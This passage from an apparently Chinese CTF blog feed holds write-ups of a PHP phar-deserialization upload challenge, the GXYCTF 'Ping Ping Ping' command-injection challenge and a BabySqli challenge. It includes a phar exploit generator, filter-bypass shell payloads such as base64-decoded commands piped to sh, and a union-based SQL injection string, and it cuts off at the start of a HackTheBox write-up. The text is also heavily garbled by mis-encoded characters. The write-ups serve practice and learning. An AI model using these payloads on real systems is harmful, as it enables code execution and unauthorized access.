class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $cmd;</span><br><span class="line"><span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">$ext = <span class="string">".txt"</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (â€²â–½`ã€ƒ)');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"><span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±æœ‰ç‚¹ä»¥å‰ååºåˆ—åŒ–çš„æ„æ€äº†ï¼Œè€Œä¹‹æ‰€ä»¥é¢˜ç›®æ˜¯pharååºåˆ—åŒ–ï¼Œå°±æ˜¯å› ä¸ºpharçš„ä¼˜åŠ¿å°±åœ¨äºå¯ä»¥åœ¨ä¼ªé€ æ–‡ä»¶ç±»å‹çš„åŒæ—¶åˆ©ç”¨phar://æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚é‚£æˆ‘ä»¬ç›´æ¥çœ‹çœ‹è¦å¦‚ä½•åˆ©ç”¨ï¼š<br>é¦–å…ˆæ˜¯æ‰¾å¯æ§å‚æ•°ï¼Œæˆ‘ä»¬æ‰¾åˆ°nameå‚æ•°æ˜¯é€šè¿‡getä¼ çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨æ‰¾å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åªè¦ä¿è¯tokenæ˜¯ä¸userçš„sessionç›¸åŒå³å¯evalæ‰§è¡Œå‘½ä»¤ã€‚<br>é‚£ä¹ˆåŒæ—¶æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡$uploaderåœ¨_toStringæ–¹æ³•ä¸­çœ‹åˆ°ï¼Œè¿”å›å€¼æ˜¯filename,ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„nameçš„å€¼ã€‚é‚£æˆ‘ä»¬åªè¦è®©æœ€åçš„file_get_contents()æ‰§è¡Œæ—¶è¯»æˆ‘ä»¬å¯æ§çš„flag.phpå°±å¥½äº†ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå…ˆéšä¾¿ä¼ ä¸€ä¸ªæ–‡ä»¶ç¡®å®šä¸‹æç¤ºæˆ‘ä»¬çš„æ–‡ä»¶ä½ç½®ï¼Œç¡®è®¤token,ç„¶åæœ¬åœ°ç”Ÿæˆpharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o=<span class="keyword">new</span> Uploader();</span><br><span class="line">$o-&gt;cmd=<span class="string">'highlight_file("/var/www/html/flag.php)'</span>;</span><br><span class="line">$o-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">$o-&gt;token=<span class="string">'GXYbef648df4f254d89810fd44f9a2fc822'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ pharåï¼Œnameå‚æ•°èµ‹å€¼<br><code>phar://+ä¸Šä¼ pharæ–‡ä»¶çš„åœ°å€</code><br>å†éšä¾¿ä¸Šä¼ æ–‡ä»¶å°±å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚</p><p>å…¶å®å› ä¸ºå‡ºé¢˜äººå¤šæ‰“äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´æ­£åˆ™åŒ¹é…æ²¡æ•ˆæœâ€¦â€¦ç›´æ¥ä¼ ä¸€å¥è¯æˆ–è€…ç›´æ¥åŒ…å«flag.phpåä¼ æ–‡ä»¶éƒ½å¯ä»¥æ‹¿flagâ€¦â€¦</p><p>GXYçš„é¢˜å°±å…ˆå‘Šä¸€æ®µè½å§ï¼Œæ˜å¤©è¿˜è¦åšåšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œä¹‹åè¦æŠŠåŸºç¡€æ¼æ´ç›¸å…³çŸ¥è¯†éƒ½äº†è§£é€å½»ï¼Œæ¯•ç«Ÿè‡ªå·±åº•å­ä¸ç‰¢ã€‚ç„¶åæŠŠæ¬ ç€çš„ssrf,pharç­‰ç­‰éƒ½ç³»ç»Ÿå­¦ä¸€å­¦åº”è¯¥å°±å¥½äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--PingPingPing&amp;BabySqli</title>
      <link href="2020/01/13/GXYCTF-PingPingPing-BabySqli/"/>
      <url>2020/01/13/GXYCTF-PingPingPing-BabySqli/</url>
      
        <content type="html"><![CDATA[<p>  è¯´æ¥æƒ­æ„§ï¼Œä¹‹å‰12æœˆä»½åˆæŠ¥äº†GWYCTF,ç»“æœåˆ°äº†æ¯”èµ›çš„æ—¶å€™åˆå› ä¸ºå¤ä¹ å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œæ‰€ä»¥ä¸€é“é¢˜ç›®éƒ½æ²¡çœ‹ã€‚åˆšå¥½å› ä¸ºé¢˜ç›®éš¾åº¦æ˜¯é’ˆå¯¹æ ¡å†…æ‹›æ–°çš„ï¼Œæˆ‘å°±ç°åœ¨å¤ç°ä¸‹å§ï¼š<br>é¢˜ç›®å¤ç°åœ°å€ï¼š<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a><br>å¤§ä½¬ä»¬åœ¨å„ç§æ¯”èµ›ç¾¤é‡Œåº”è¯¥å·²ç»çŸ¥é“äº†è¿™ä¸ªå¹³å°çš„å­˜åœ¨äº†ï¼Œæœ‰ä¸€è¯´ä¸€é‚£ä½å¸ˆå‚…æ˜¯çœŸçš„å¯Œâ€¦â€¦<br>è¿˜æ˜¯è¦æ„Ÿè°¢buuoj.cnæä¾›äº†ä¸€ä¸ªå¤ç°è¿™äº›å¹´å¤§èµ›é¢˜ç›®çš„æœºä¼šã€‚</p><a id="more"></a><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>å¼€å§‹è¿›å…¥æç¤ºä¼ å‚ip,åŸé¢˜åº”è¯¥æ˜¯ç›´æ¥ç»™äº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥åå‘ç°æœ‰æ‰§è¡Œpingå‘½ä»¤çš„æ•ˆæœ<br>é‚£ä¹ˆçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®äº†ï¼Œå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å¤§æŠµæ˜¯åŠ ä¸Šç®¡é“ç¬¦æˆ–è€…åˆ†å·ï¼Œé‚£ä¹ˆè¯•è¯•ç®¡é“ç¬¦<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ls"><br>å°è¯•è¯»flagå‘ç°æœç„¶è¢«banäº†ï¼Œé‚£ä¹ˆè¯•è¯•index.phpå‘ç°æç¤ºç©ºæ ¼è¢«banäº†ã€‚<br>ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;Â  &#x2F;&#x2F;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>ä¸å¦¨å°±ç”¨ <code>$IFS</code>è¯•è¯•ï¼Œæ— æœï¼Œç”¨<code>${IFS}</code>å‘ç°{}è¢«banã€‚å†è¯•<code>$IFS$1</code>æˆåŠŸã€‚<br>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†è®¸å¤šæ ‡ç‚¹ï¼Œç©ºæ ¼ï¼Œbash,åŒ…æ‹¬flagçš„è´ªå©ªåŒ¹é…ã€‚é‚£ä¹ˆè‡ªå·±å°è±¡ä¸­å‡ ç§åšæ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.cat fl*       åˆ©ç”¨*åŒ¹é…ä»»æ„ ä¸è¡Œ</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash   ä¹Ÿä¸è¡Œ</span><br><span class="line">3.ca\t fl\ag.php   ä¸è¡Œ</span><br><span class="line">4.cat fl&#39;&#39;ag.php ä¸è¡Œ</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿå…¶å®è¿˜æœ‰ä¸€ç§æ¯”è¾ƒå¸¸è§çš„åšæ³•æ²¡æœ‰æåŠï¼Œé‚£å°±æ˜¯å˜é‡æ‹¼æ¥ï¼š<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å˜é‡æ‹¼æ¥"><br>ä¹‹å‰è‡ªå·±ç‰¹åˆ«å–œæ¬¢ç”¨çš„ä¸€å¥è¯æœ¨é©¬æ‹†å¼€ç”¨ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚</p><p>æ­£å¥½ï¼Œæˆ‘ä»¬çœ‹åˆ°æºç ä¸­æœ‰ä¸€ä¸ª$aå˜é‡å¯ä»¥è¦†ç›–ï¼Œé‚£ä¹ˆpayloadå°±å‡ºæ¥äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰å®˜æ–¹ä¸å…¶ä»–å¤§ä½¬çš„é«˜ç«¯è§£æ³•ï¼š<br>å®˜æ–¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤bash?é‚£å°±ç”¨shã€‚shçš„å¤§éƒ¨åˆ†è„šæœ¬éƒ½å¯ä»¥åœ¨bashä¸‹è¿è¡Œã€‚</p><p>dalao<br>å†…è”æ‰§è¡Œçš„åšæ³•ï¼Œåªèƒ½è¯´V&amp;Nçš„å¸ˆå‚…ä»¬å¤ªå¼ºäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚<br>ç§’é¢˜å¤§æ¦‚å°±æ˜¯è¿™ç§åšæ³•å§â€¦â€¦</p><h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>è¿›å»åä¸€ä¸ªè´¦å·ï¼Œå¯†ç è¾“å…¥æ¡†ã€‚å…ˆéšä¾¿è¾“ä¸‹ï¼Œæç¤ºwrong passã€‚ä½†æ˜¯çœ‹æºç æœ‰æ„å¤–æ”¶è·<img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="FUZZ"><br>ä»å½¢å¼ä¸Šçœ‹æ•°å­—æˆåˆ†éƒ½æ²¡æœ‰è¶…è¿‡6,å¯èƒ½æ˜¯base32ï¼Œè§£ç åå¾—åˆ°ä¸€ä¸ªbase64ç¼–ç ï¼Œè§£ç åå¾—åˆ°ä»¥ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥åœ¨usernameè¿™ä¸ªæ³¨å…¥ç‚¹ä¸‹æ‰‹å¤„ç†äº†ã€‚è¿™é“é¢˜ç›®åªè¿‡æ»¤äº†åŸºæœ¬çš„andä¸ç­‰å·è¿˜æ˜¯å¾ˆèƒ½æ“ä½œçš„ã€‚ä¸è¿‡åæ¥çœ‹åˆ«äººè¯´è¿™é¢˜è€ƒç‚¹åœ¨MD5æŸ¥è¯¢ç»•è¿‡ã€‚è¿™ä¹ˆè¯´çš„åŸå› æ˜¯ï¼Œå°±ç®—æˆåŠŸæ³¨å…¥æŠŠadminå¯†ç çš„MD5æ‹¿åˆ°ï¼Œå› ä¸ºè§£ä¸äº†çš„ç¼˜æ•…ç­‰äºæ²¡ç”¨ã€‚åŸºäºé¢˜ç›®æç¤ºçš„wrong passï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯ç›´æ¥æ‹¿è¾“å…¥å¯†ç çš„MD5æ•°å€¼è·Ÿæ•°æ®åº“é‡Œå·²çŸ¥å€¼æ¯”è¾ƒã€‚</p><p>ç¨å¾®FUZZä¸€ä¸‹<code>admin&#39; union select 1,2,3</code>å¯ä»¥ç¡®è®¤æœ‰ä¸‰ä¸ªå­—æ®µ<br>åé¢ç¡®è®¤å¤§æ¦‚æ˜¯id,adminï¼Œpasswdä¸‰ä¸ªå­—æ®µã€‚è¿™é‡Œä¸ºäº†ç»•è¿‡ï¼Œéœ€è¦ä¿è¯æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æ„ä¸€è‡´ï¼Œå°±å¯ç›´æ¥select æƒ³è¦çš„è¿”å›å€¼ã€‚<br>é‚£ä¹ˆæ„é€ ä¸€ä¸ªä¸ºå‡çš„æŸ¥è¯¢-1ï¼Œåé¢æ¥ä¸Šè”åˆæŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;#</span><br></pre></td></tr></table></figure><p>å¯†ç è¾“123å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Wall</title>
      <link href="2020/01/12/hackthebox-Wall/"/>
      <url>2020/01/12/hackthebox-Wall/</url>
      
        <content type="html"><![CDATA[<p> æ€»ç®—æ˜¯æŒºè¿‡äº†æœŸæœ«12é—¨çš„é­”é¬¼è€ƒè¯•æ—¥ç¨‹ï¼Œè¿æ¥äº†å¯’å‡â€¦â€¦è¿™æ¬¡å¯’å‡æ‰“ç®—å­¦çš„è¿˜æŒºå¤šçš„ï¼Œä¹Ÿå¸Œæœ›è‡ªå·±èƒ½åšæŒå­¦ä¹ ï¼ŒæŠŠçŸ¥è¯†å°½é‡èä¼šè´¯é€šå§ã€‚ä¹‹å‰æ›¾è¯´è¿‡å¸Œæœ›èƒ½æ—©æ—¥æ‹¿ä¸‹è‡ªå·±åœ¨hacktheboxä¸Šçš„ç¬¬ä¸€å°é¶æœºï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±åœ¨å¸®åŠ©ä¸‹æ‹¿åˆ°æ‰‹äº†ã€‚å…¶å®åœ¨è¿›å…¥æœŸæœ«å¤ä¹ é˜¶æ®µä¸­çš„ä¸€æ®µæ—¶é—´ï¼Œè‡ªå·±å°±å‚è€ƒyoutubeä¸Šä¸€ä½ä¼˜ç§€çš„hacker youtuberå…³äºhacktheboxçš„è§†é¢‘æˆåŠŸæ‹¿åˆ°äº†é¶æœºï¼Œåªä¸è¿‡ä¸€ç›´æ²¡å†™æ–‡ç« ã€‚è€Œç°åœ¨è¿™å°Wallé¶æœºåœ¨hacktheboxä¸Šä¹Ÿå·²ç»å¤„äºä¸‹æ¶çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘å°±ç®€å•è®°å½•ä¸€ä¸‹æ‹¿ä¸‹Wallçš„è¿‡ç¨‹ï¼Œæ²¡æ³•è´´å®æ“å›¾äº†ã€‚</p><a id="more"></a><p>å‚è€ƒçš„youtuber:IppSec  <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" target="_blank" rel="noopener">https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA</a><br>å¹¸å¥½è‡ªå·±è‹±è¯­æ°´å¹³è¿‡ç¡¬ï¼Œå¯ä»¥å•ƒä»–çš„ç”Ÿè‚‰è§†é¢‘ã€‚æ„Ÿè°¢è¿™ä½å¤§ä½¬ï¼Œç¡®å®å¸®åˆ°äº†æˆ‘å¾ˆå¤šã€‚</p><p><img src="/2020/01/12/hackthebox-Wall/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Wall"><br><strong>æœ¬æœºip:10.10.14.3</strong><br>(ä¹Ÿè®¸å§,è®°ä¸å¾—äº†hhh)<br><strong>é¶æœºip:10.10.10.157</strong></p><p>ç„¶åå›é¡¾ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹å§ã€‚é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯ä½¿ç”¨hacktheboxæä¾›ç»™æˆ‘ä»¬çš„ovpnè¿æ¥ã€‚è¿™æ 